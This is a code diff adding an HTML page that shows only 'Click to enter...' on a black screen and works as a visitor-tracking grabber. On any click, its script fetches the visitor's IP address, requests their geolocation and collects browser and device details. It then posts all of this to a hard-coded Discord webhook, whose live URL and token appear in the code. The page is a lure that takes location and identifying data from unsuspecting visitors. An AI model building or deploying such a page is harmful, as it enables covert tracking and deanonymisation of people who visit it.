@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Device Information Collector</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh; /* Full viewport height */
+      margin: 0; /* Remove default margin */
+      background-color: black; /* Black background */
+      color: gray; /* Gray text */
+    }
+    #info {
+      font-size: 18px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1 id="click-to-enter">Click to enter...</h1>
+  <div id="info"></div>
+  <script>
+    // Discord Webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1275537111755522189/snOtFHUF9X35Mjfx3gaYyyZS4M1Un-sYtcYkrc3Sw0omUl6MLrd33AnepHKZm8sprUVj';
+
+    // Function to collect device information
+    function collectDeviceInfo() {
+      // Get user's IP address using IPify API
+      fetch('https://api.ipify.org?format=json')
+       .then(response => response.json())
+       .then(data => {
+          const ipAddress = data.ip;
+
+          // Collect geolocation data
+          navigator.geolocation.getCurrentPosition(position => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const geolocationData = `${latitude}, ${longitude}`;
+
+            // Collect other device information
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            const deviceType = navigator.userAgent.match(/Mobile|Tablet|Desktop/)? navigator.userAgent.match(/Mobile|Tablet|Desktop/)[0] : 'Unknown';
+
+            // Create a JSON payload with collected device information
+            const payload = {
+              ipAddress,
+              geolocation: geolocationData,
+              userAgent,
+              screenResolution,
+              language,
+              platform,
+              deviceType
+            };
+
+            // Display user's information
+            const infoElement = document.getElementById('info');
+            const infoText = `
+              Your Device Information:
+              IP Address: ${ipAddress}
+              Geolocation: ${geolocationData}
+              User Agent: ${userAgent}
+              Screen Resolution: ${screenResolution}
+              Language: ${language}
+              Platform: ${platform}
+              Device Type: ${deviceType}
+            `;
+            infoElement.innerText = infoText;
+
+            // Send the payload to the Discord webhook
+            const webhookPayload = {
+              content: "```" + infoText + "```"
+            };
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(webhookPayload)
+            })
+             .then(response => console.log('Device information sent successfully'))
+             .catch(error => console.error('Failed to send device information:', error));
+          });
+        })
+       .catch(error => console.error('Failed to get IP address:', error));
+    }
+
+    // Add event listener to the document to collect device information on click
+    document.addEventListener('click', collectDeviceInfo);
+  </script>
+</body>
+</html>
